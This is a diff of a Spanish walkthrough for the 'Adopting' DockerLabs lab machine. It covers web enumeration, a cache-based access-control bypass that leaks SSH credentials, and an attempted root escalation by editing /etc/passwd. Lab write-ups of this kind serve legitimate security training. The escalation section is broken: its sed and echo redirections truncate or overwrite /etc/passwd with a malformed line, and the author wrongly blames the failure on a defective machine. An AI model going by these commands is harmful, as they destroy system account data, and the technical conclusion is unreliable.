@@ -1,5 +1,4 @@
-<img width="983" height="1041" alt="image" src="https://github.com/user-attachments/assets/0320d8a3-a2c3-4929-8ff3-d3b4099db755" /># Adopting-DockerLabs🇪🇸
-
+# Adopting-DockerLabs🇪🇸
 
 ## 1 Encender laboratorio.
 
@@ -66,7 +65,8 @@ gobuster dir -u http://172.17.0.2:2300/ -w /usr/share/seclists/Discovery/Web-Con
 <img width="996" height="418" alt="image" src="https://github.com/user-attachments/assets/b5eb4bc3-d338-4e27-8217-051a8adc03f3" />
 
 
-### Explotación
+## 3. Análisis de vulnerabilidades
+
 
 #### 3.0 Mediante BurpSuite vamos a ver la paqueteria POST y GET, mandaremos al repetear el paquete POST que devuelve tus creedenciales.
 
@@ -86,5 +86,68 @@ gobuster dir -u http://172.17.0.2:2300/ -w /usr/share/seclists/Discovery/Web-Con
 
 <img width="937" height="734" alt="image" src="https://github.com/user-attachments/assets/ddaa36a0-28c4-4f2c-a079-463843f07629" />
 
+## 4. Explotación
 
-#### 3.4 
+####  Al saber que podemos acceder al pdf nuestro sabiendo que no se queda guardado en el servidor sino se queda guardado en el cache podremos acceder a ese pdf que no tenemos permiso con un user administrador y asi se quedara guardado en la cache y podremos entrar desde adri con nomalidad.
+
+#### 4.1 Llamaremos la atención del administrador mediante una consulta para que entre con sus permisos al pdf.
+
+
+<img width="1918" height="1005" alt="image" src="https://github.com/user-attachments/assets/7c0cf7e0-d8f2-4286-ab48-def338a98c17" />
+
+
+#### 4.2 Conseguimos todas las creedenciales para acceder mediante el ssh por el documento PDF.
+
+<img width="930" height="900" alt="image" src="https://github.com/user-attachments/assets/7a0112d8-faeb-4df9-ac63-662715198d3f" />
+
+
+## 5. Intrusión y escala de privilegios
+
+#### 5.0 Entramos mediante ssh.
+```bash
+ssh pingu@172.17.0.2
+# passwd : chocolate
+```
+
+<img width="987" height="383" alt="image" src="https://github.com/user-attachments/assets/4a5d994f-81ad-4a91-a04b-acd07d29ff0b" />
+
+
+#### 5.1 No sabemos en que distro estamos de linux.
+```bash
+uname -a
+```
+<img width="988" height="66" alt="image" src="https://github.com/user-attachments/assets/d233c00f-1b7d-4bfd-bf10-9761f47c954d" />
+
+
+#### 5.2 Vemos que estamos dentro de los pinguinos.
+```bash
+cat /etc/passwd
+ls -l /etc/passwd
+```
+
+<img width="988" height="468" alt="image" src="https://github.com/user-attachments/assets/a5037fe7-78e6-4235-b51c-11e30586a443" />
+
+
+#### No podemos utilizar `sed -i 's/root:xroot:/g' /etc/passwd` para modificar los permisos en /passwd porque no tenemos los permisos de `/etc` para poder entrar.
+
+#### 5.3 Asi que haremos la secuencia pero redirigiendo el archivo a la carpeta y sobreescribirlo en blanco.
+```bash
+sed 's/root:x/root:/g' /etc/passwd > /etc/passwd
+cat /etc/passwd
+```
+
+<img width="991" height="231" alt="image" src="https://github.com/user-attachments/assets/755ae9fe-0baa-4038-b608-b97c94be0019" />
+
+
+#### 5.4 Ahora sobreescribiremos la linea de root para que no se corrompa el sistema.
+```bash
+echo 'root::0:0:root/root:/bin/sh' > /etc/passwd
+```
+
+<img width="979" height="73" alt="image" src="https://github.com/user-attachments/assets/8a152976-efde-486e-8351-9b6e577ba2a2" />
+
+
+### La máquina está defectuosa y no se puede escalar a root, en una máquina con la SUID sana seria vulnerable.
+
+
+
